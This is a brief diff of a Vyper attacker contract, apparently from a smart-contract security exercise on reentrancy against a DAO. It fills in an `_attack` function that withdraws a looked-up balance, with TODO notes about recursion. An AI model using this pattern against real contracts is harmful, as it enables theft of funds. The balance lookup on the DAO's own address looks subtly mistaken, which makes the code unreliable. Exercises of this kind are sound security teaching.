@@ -14,10 +14,10 @@ def __init__():
 @internal
 def _attack() -> bool:
     assert self.dao_address != ZERO_ADDRESS
-    
+    balance = DAO(self.dao_address).userBalances(self.dao_address)
     # TODO: Use the DAO interface to withdraw funds.
     # Make sure you add a "base case" to end the recursion
-    DAO(self.dao_address).withdraw(value = 1)
+    DAO(self.dao_address).withdraw(value=balance)
 
     return True
 
